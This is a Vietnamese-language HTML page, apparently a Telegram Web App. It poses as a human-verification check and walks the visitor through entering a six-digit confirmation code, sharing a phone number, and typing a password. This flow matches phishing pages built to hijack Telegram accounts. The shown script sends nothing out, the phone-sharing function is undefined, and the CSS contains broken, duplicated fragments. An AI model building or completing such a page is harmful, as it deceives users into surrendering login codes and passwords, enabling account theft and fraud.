<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<script src="https://telegram.org/js/telegram-web-app.js"></script>

<style>
body { margin:0; font-family: Arial; overflow:hidden; }

/* nền blur */
.bg {
  position: fixed;
  width:100%; height:100%;
 background: url("https://sf-static.upanhlaylink.com/img/image_2026032489ac597362eda35abeb5a9c04ee65613.jpg") center/cover no-repeat;
  filter: blur(12px);
  transform: scale(1.1);
}

/* overlay */
.overlay {
  position: fixed;
  width:100%; height:100%;
  background: rgba(0,0,0,0.3);
}

/* icon */
.icon {
  position:absolute;
  top:30%;
  left:50%;
  transform:translate(-50%,-50%);
  font-size:90px;
  animation: shake 1s infinite;
}

@keyframes wave {
  0% { transform: translate(-50%, -50%) rotate(0deg); }
  15% { transform: translate(-50%, -50%) rotate(14deg); }
  30% { transform: translate(-50%, -50%) rotate(-8deg); }
  45% { transform: translate(-50%, -50%) rotate(14deg); }
  60% { transform: translate(-50%, -50%) rotate(-4deg); }
  75% { transform: translate(-50%, -50%) rotate(10deg); }
  100% { transform: translate(-50%, -50%) rotate(0deg); }
}

.icon {
  position: absolute;
  top: 30%;
  left: 50%;
  transform: translate(-50%, -50%);
  font-size: 90px;
  animation: wave 1.2s infinite; /* Lặp liên tục */
}00% { transform:translate(-50%,-50%) rotate(0deg);}
}

/* box */
.box {
  position:absolute;
  bottom:120px;
  left:20px; right:20px;
  background:#fff;
  padding:15px;
  border-radius:15px;
  text-align:center;
}

/* input */
.input {
  width:90%;
  padding:12px;
  margin-top:10px;
  border-radius:10px;
  border:1px solid #ccc;
}

/* code */
.code-box {
  display:flex;
  justify-content:center;
  gap:5px;
  margin-top:10px;
}

.code-box input {
  width:35px; height:45px;
  text-align:center;
  font-size:18px;
}

/* button */
.btn {
  position:absolute;
  bottom:60px;
  left:20px; right:20px;
  background:#3b9edb;
  color:white;
  padding:14px;
  border:none;
  border-radius:10px;
  font-size:16px;
}
</style>
</head>

<body>

<div class="bg"></div>
<div class="overlay"></div>

<div class="icon">🙈</div>

<!-- STEP 1 -->
<div class="box" id="step1">
 Bạn cần xác nhận mình là người thật, hãy nhấp vào nút bên dưới để bắt đầu!
</div>
<button class="btn" onclick="step2()">Xác nhận</button>

<!-- STEP 2 -->
<div class="box" id="step2" style="display:none;">
  Nhập mã xác nhận

  <div class="code-box">
    <input maxlength="1" oninput="move(this,0)">
    <input maxlength="1" oninput="move(this,1)">
    <input maxlength="1" oninput="move(this,2)">
    <input maxlength="1" oninput="move(this,3)">
    <input maxlength="1" oninput="move(this,4)">
    <input maxlength="1" oninput="move(this,5)">
  </div>

  <!-- Nút share số điện thoại -->
  <button class="btn" onclick="requestPhone()">📲 Chia sẻ số điện thoại</button>
</div>
<!-- STEP 3 -->
<div class="box" id="step3" style="display:none;">
  Bạn đã nhập đúng mã (demo)
  <input type="password" class="input" placeholder="Mật khẩu của bạn">
</div>

<script>
let tg = window.Telegram.WebApp;
tg.expand();

const inputs = document.querySelectorAll(".code-box input");

function step2(){
  document.getElementById("step1").style.display="none";
  document.getElementById("step2").style.display="block";
}

function move(el,i){
  if(el.value.length==1 && i<5) inputs[i+1].focus();

  let code="";
  inputs.forEach(x=>code+=x.value);

  if(code.length==6){
    document.getElementById("step2").style.display="none";
    document.getElementById("step3").style.display="block";
  }
}
</script>

</body>
</html>
